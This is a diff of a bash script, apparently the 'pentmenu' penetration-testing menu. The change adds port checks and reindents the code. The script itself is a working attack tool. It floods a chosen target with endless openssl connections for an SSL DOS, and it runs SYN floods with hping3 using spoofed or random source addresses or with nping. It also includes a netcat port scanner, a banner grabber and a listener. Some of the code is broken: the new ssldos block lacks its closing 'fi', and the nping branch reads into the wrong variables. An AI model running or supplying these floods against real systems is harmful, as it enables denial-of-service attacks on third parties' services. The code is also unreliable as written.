@@ -3,168 +3,182 @@ PS3="Pentmenu>"
 ## create ssldos function
 ssldos() 
 { echo "Using openssl for SSL DOS"
-echo "Enter target:"
+	echo "Enter target:"
 read TARGET
-echo "Enter target port (defaults to 443):"
+	echo "Enter target port (defaults to 443):"
 read PORT
+
 : ${PORT:=443}
-echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
+
+if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
+	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
+fi
+if [ "$PORT" -lt "1" ]; then
+	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
+elif [ "$PORT" -gt "65535" ]; then
+	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
+else echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
+	
 while : for i in {1..10} 
-do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
 done
 }
 ## create listener function
 listener ()
-{ echo "Enter protocol, [t]cp (default) or [u]dp:"
+	{ echo "Enter protocol, [t]cp (default) or [u]dp:"
 read PROTO
-: ${PROTO:=t}
+	: ${PROTO:=t}
 if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
-echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
+	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
 fi
-echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
-if test -f "/bin/ss"; then LISTPORT=ss; 
-else LISTPORT=netstat
+	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
+if test -f "/bin/ss"; then 
+	LISTPORT=ss; 
+	else LISTPORT=netstat
+
 fi
-$LISTPORT -$PROTO -n -l 
+	$LISTPORT -$PROTO -n -l 
 echo "Enter port number (defaults to 8000):"
-read PORT
+	read PORT
 : ${PORT:=8000}
-if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
-PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
-fi
-if [ "$PORT" -lt "1" ]; then
-PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
-elif [ "$PORT" -gt "65535" ]; then
-PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000" 
-else echo "Using netcat to create listener:"
+	if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
+		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
+	fi
+	if [ "$PORT" -lt "1" ]; then
+		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
+	elif [ "$PORT" -gt "65535" ]; then
+		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000" 
+	else echo "Using netcat to create listener:"
 fi
 echo "Use ctrl c to stop"
 if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
-sudo nc -k -l -v -p $PORT
-	if ! [[ $? = 0 ]]
+	sudo nc -k -l -v -p $PORT
+if ! [[ $? = 0 ]]
 	then 
-	echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
-	sudo nc -l -v -p $PORT
-	fi
+		echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
+		sudo nc -l -v -p $PORT
+fi
+
 elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
 nc -k -l -v -p $PORT
-	if ! [[ $? = 0 ]]
-	then 
+
+if ! [[ $? = 0 ]]; then 
 	echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
 	nc -l -v -p $PORT
-	fi
+fi
+
 elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
 sudo nc -u -k -l -v -p $PORT
-	if ! [[ $? = 0 ]]
-	then 
-	echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
-	sudo nc -u -l -v -p $PORT
+	if ! [[ $? = 0 ]]; then 
+		echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
+		sudo nc -u -l -v -p $PORT
 	fi
 elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
-nc -u -k -l -v -p $PORT
-	if ! [[ $? = 0 ]]
-	then 
-	echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
-	nc -u -l -v -p $PORT
+	nc -u -k -l -v -p $PORT
+		if ! [[ $? = 0 ]]; then 
+			echo "Doesn't look like GNU netcat, so trying again without '-k' option!"
+			nc -u -l -v -p $PORT
+		fi
 	fi
-fi
 }
+
 ## define simple banner grabber
 bannergrab()
 { echo "Attempting to grab banners using netcat..."
 	echo "Enter target"
 	read TARGET
-	echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
+		echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
 	read PORT
-	echo "Starting..."
+		echo "Starting..."
 		echo -e "HEAD / HTTP/1.0\r\n\r\n"| nc -vw 2 $TARGET $PORT
 }
+
 ## create menu and show welcome message
-clear && echo ""
-echo "Hello and welcome to pentmenu!"
-echo "This software is only for responsible, authorised use."
-echo "YOU are responsible for your own actions!"
-echo ""
-options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "SSL DOS" "Create Listener" "Quit")
-select opt in "${options[@]}"; do
+	clear && echo ""
+	echo "Hello and welcome to pentmenu!"
+	echo "This software is only for responsible, authorised use."
+	echo "YOU are responsible for your own actions!"
+	echo ""
+	options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "SSL DOS" "Create Listener" "Quit")
+	select opt in "${options[@]}"; do
 ## quit 
 	if [ "$opt" = "Quit" ]; then
-	echo "Quitting" && sleep 1 && clear
+		echo "Quitting" && sleep 1 && clear
 	exit 0
 ## show external IP
 	elif [ "$opt" = "Show IP" ]; then
-	echo "External IP lookup uses curl..."
-	echo "External IP is detected as:"
-	curl http://canihazip.com/s/
-	echo ""
+		echo "External IP lookup uses curl..."
+		echo "External IP is detected as:"
+		curl http://canihazip.com/s/
+		echo ""
 ## TCP SYN Flood DOS
  	elif [ "$opt" = "TCP SYN Flood" ]; then
-	echo "TCP SYN Flood uses hping3...checking for hping3..."
+		echo "TCP SYN Flood uses hping3...checking for hping3..."
 	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 ## hping3 is found, so use that for TCP SYN Flood
 	echo "Enter target"
-	read TARGET
+		read TARGET
 	echo "Enter target port"
-	read PORT
+		read PORT
 	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
-	read SOURCE
+		read SOURCE
 	: ${SOURCE:=i}
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
-	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "r" ]; then
-	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sudo hping3 --flood --rand-source -p $PORT -S $TARGET
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood --rand-source -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "i" ]; then
-	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sudo hping3 --flood -p $PORT -S $TARGET
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -p $PORT -S $TARGET
 	else echo "Not a valid option!  Using interface IP"
-	echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-	sudo hping3 --flood -p $PORT -S $TARGET
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -p $PORT -S $TARGET
 	fi
 ## No hping3 so using nping for TCP SYN Flood
 	else echo "hping3 not found :( trying nping instead"
-	echo ""
-	echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
-	echo "Enter target"
+		echo ""
+		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
+		echo "Enter target"
 	read TARGET
-	echo "Enter target port"
+		echo "Enter target port"
 	read PORT
-	echo "Enter Source IP or use [i]nterface IP (default):"
+		echo "Enter Source IP or use [i]nterface IP (default):"
 	read SOURCE
-	: ${SOURCE:=i}
-	echo "Enter number of packets to send per second (default is 1000):"
+		: ${SOURCE:=i}
+		echo "Enter number of packets to send per second (default is 1000):"
 	read $RATE
-	: ${RATE:=1000}
-	echo "Enter total number of packets to send (default is 10000):"
+		: ${RATE:=1000}
+		echo "Enter total number of packets to send (default is 10000):"
 	read $TOTAL
-	: ${TOTAL:=10000}
-	echo "Starting TCP SYN Flood..."
+		: ${TOTAL:=10000}
+		echo "Starting TCP SYN Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
-	sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
+		sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
 	else sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
 	fi
 	fi
 ## TCP SYN Port Scan using nc
 	elif [ "$opt" = "TCP Port Scanner" ]; then
-	echo "TCP Port Scanner uses netcat..."
-	echo "Enter target IP"
+		echo "TCP Port Scanner uses netcat..."
+		echo "Enter target IP"
 	read TARGET
-	echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
+		echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
 	read PORT
-	echo "Starting TCP Port Scan"
-	nc -zv $TARGET $PORT
+		echo "Starting TCP Port Scan"
+		nc -zv $TARGET $PORT
 	elif [ "$opt" = "Create Listener" ]; then
-	listener
+		listener
 ## Simple Banner Grabber
 	elif [ "$opt" = "Banner Grabber" ]; then
-	bannergrab
+		bannergrab
 ## SSL DOS
 	elif [ "$opt" = "SSL DOS" ]; then
-	ssldos
+		ssldos
 ## Default if no menu option selected is to return an error
 	else
-  	echo  "That's not a valid option! Hit Return to show main menu"
+  		echo  "That's not a valid option! Hit Return to show main menu"
 	fi
 done
 exit 0
